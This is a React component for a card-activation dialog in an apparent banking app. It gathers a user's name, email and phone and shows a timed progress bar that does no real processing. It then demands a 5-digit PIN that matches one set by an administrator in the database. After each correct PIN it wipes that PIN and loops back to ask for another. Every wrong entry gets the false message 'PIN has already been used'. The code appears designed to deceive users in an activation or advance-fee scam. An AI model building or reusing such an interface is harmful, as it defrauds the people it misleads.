import { useState, useRef, useEffect, useCallback } from "react";
import { X, Loader2, CheckCircle2, AlertCircle } from "lucide-react";
import { useBankData } from "@/hooks/use-bank-data";
import { supabase } from "@/lib/supabase";
import { useAuth } from "@/hooks/useAuth";

type Step = "form" | "loading" | "pin";

interface Props {
  open: boolean;
  onClose: () => void;
}

export default function ActivationModal({ open, onClose }: Props) {
  const data = useBankData();
  const { user } = useAuth();
  const [step, setStep] = useState<Step>("form");
  const [form, setForm] = useState({ name: "", email: "", phone: "" });
  const [pin, setPin] = useState(["", "", "", "", ""]);
  const [pinError, setPinError] = useState(false);
  const [pinSuccess, setPinSuccess] = useState(false);
  const [progress, setProgress] = useState(0);
  const [currentPin, setCurrentPin] = useState(data.adminPin);
  const [verifying, setVerifying] = useState(false);
  const pinRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Keep currentPin in sync with data changes
  useEffect(() => {
    setCurrentPin(data.adminPin);
  }, [data.adminPin]);

  const reset = useCallback(() => {
    setStep("form");
    setForm({ name: "", email: "", phone: "" });
    setPin(["", "", "", "", ""]);
    setPinError(false);
    setPinSuccess(false);
    setProgress(0);
    setVerifying(false);
  }, []);

  useEffect(() => {
    if (!open) reset();
  }, [open, reset]);

  useEffect(() => {
    if (step === "loading") {
      setProgress(0);
      const interval = setInterval(() => {
        setProgress((p) => {
          if (p >= 100) {
            clearInterval(interval);
            setTimeout(() => {
              setStep("pin");
              setVerifying(false);
            }, 300);
            return 100;
          }
          return p + 2;
        });
      }, 100);
      return () => clearInterval(interval);
    }
  }, [step]);

  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setStep("loading");
  };

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const next = [...pin];
    next[index] = value.slice(-1);
    setPin(next);
    setPinError(false);
    setPinSuccess(false);
    if (value && index < 4) pinRefs.current[index + 1]?.focus();
  };

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      pinRefs.current[index - 1]?.focus();
    }
  };

  const handlePinSubmit = async () => {
    const entered = pin.join("");
    
    // Re-fetch the latest pin from the database to ensure we have current value
    if (user) {
      try {
        const { data: row } = await supabase
          .from("users")
          .select("pin_code")
          .eq("id", user.id)
          .single();
        if (row) {
          setCurrentPin(row.pin_code);
        }
      } catch {}
    }

    if (entered === currentPin) {
      setPinSuccess(true);
      setPinError(false);

      // Invalidate the pin by clearing it in the database
      if (user) {
        try {
          await supabase
            .from("users")
            .update({ pin_code: "" })
            .eq("id", user.id);
        } catch {}
      }

      // Show success, then go to loading animation before asking for next pin
      setTimeout(() => {
        setPinSuccess(false);
        setPin(["", "", "", "", ""]);
        setCurrentPin(""); // Pin is now invalidated
        setVerifying(true);
        setStep("loading"); // Show loading animation before next pin prompt
      }, 1500);
    } else {
      setPinError(true);
      setPinSuccess(false);
    }
  };

  if (!open) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      {/* Backdrop */}
      <div className="absolute inset-0 bg-background/80 backdrop-blur-sm animate-fade-scale" onClick={onClose} />

      {/* Modal */}
      <div className="relative glass-card-elevated w-full max-w-md p-6 md:p-8 animate-fade-scale z-10">
        <button
          onClick={onClose}
          className="absolute top-4 right-4 p-2 rounded-xl hover:bg-secondary transition-colors text-muted-foreground"
        >
          <X className="w-4 h-4" />
        </button>

        {step === "form" && (
          <form onSubmit={handleFormSubmit} className="space-y-5">
            <div>
              <h2 className="text-xl font-bold">Activate Your Card</h2>
              <p className="text-sm text-muted-foreground mt-1">Enter your details to activate</p>
            </div>
            {(["name", "email", "phone"] as const).map((field) => (
              <div key={field}>
                <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">
                  {field === "name" ? "Full Name" : field === "email" ? "Email Address" : "Phone Number"}
                </label>
                <input
                  type={field === "email" ? "email" : field === "phone" ? "tel" : "text"}
                  required
                  value={form[field]}
                  onChange={(e) => setForm({ ...form, [field]: e.target.value })}
                  className="mt-1.5 w-full rounded-xl border bg-secondary/50 px-4 py-3 text-sm outline-none
                             focus:ring-2 focus:ring-primary/30 focus:border-primary transition-all"
                  placeholder={
                    field === "name" ? "John Doe" : field === "email" ? "john@example.com" : "+1 234 567 8900"
                  }
                />
              </div>
            ))}
            <button
              type="submit"
              className="w-full rounded-xl bg-primary px-4 py-3 text-sm font-semibold text-primary-foreground
                         btn-glow hover:brightness-110 transition-all active:scale-[0.98]"
            >
              Activate Card
            </button>
          </form>
        )}

        {step === "loading" && (
          <div className="flex flex-col items-center justify-center py-12 space-y-6">
            <div className="relative">
              <Loader2 className="w-12 h-12 text-primary animate-spin" />
            </div>
            <div className="text-center">
              <p className="font-semibold">{verifying ? "Verifying…" : "Processing your request…"}</p>
              <p className="text-sm text-muted-foreground mt-1">{progress}% complete</p>
            </div>
            <div className="w-full h-2 rounded-full bg-secondary overflow-hidden">
              <div
                className="h-full rounded-full transition-all duration-100"
                style={{
                  width: `${progress}%`,
                  background: "var(--card-shine)",
                }}
              />
            </div>
          </div>
        )}

        {step === "pin" && (
          <div className="space-y-6">
            <div className="text-center">
              <h2 className="text-xl font-bold">Enter PIN</h2>
              <p className="text-sm text-muted-foreground mt-1">Enter your 5-digit verification PIN</p>
            </div>

            <div className="flex justify-center gap-3">
              {pin.map((digit, i) => (
                <input
                  key={i}
                  ref={(el) => { pinRefs.current[i] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handlePinChange(i, e.target.value)}
                  onKeyDown={(e) => handlePinKeyDown(i, e)}
                  className={`w-12 h-14 rounded-xl border text-center text-xl font-bold bg-secondary/50 outline-none
                             transition-all focus:ring-2 focus:ring-primary/30 focus:border-primary
                             ${pinError ? "border-destructive ring-2 ring-destructive/20" : ""}
                             ${pinSuccess ? "border-accent ring-2 ring-accent/20" : ""}`}
                />
              ))}
            </div>

            {pinError && (
              <div className="flex items-center justify-center gap-2 text-sm text-destructive animate-fade-scale">
                <AlertCircle className="w-4 h-4" />
                PIN has already been used
              </div>
            )}

            {pinSuccess && (
              <div className="flex items-center justify-center gap-2 text-sm text-accent animate-fade-scale">
                <CheckCircle2 className="w-4 h-4" />
                PIN verified! Processing…
              </div>
            )}

            <button
              onClick={handlePinSubmit}
              disabled={pin.some((d) => !d)}
              className="w-full rounded-xl bg-primary px-4 py-3 text-sm font-semibold text-primary-foreground
                         btn-glow hover:brightness-110 transition-all active:scale-[0.98]
                         disabled:opacity-40 disabled:pointer-events-none"
            >
              Submit
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
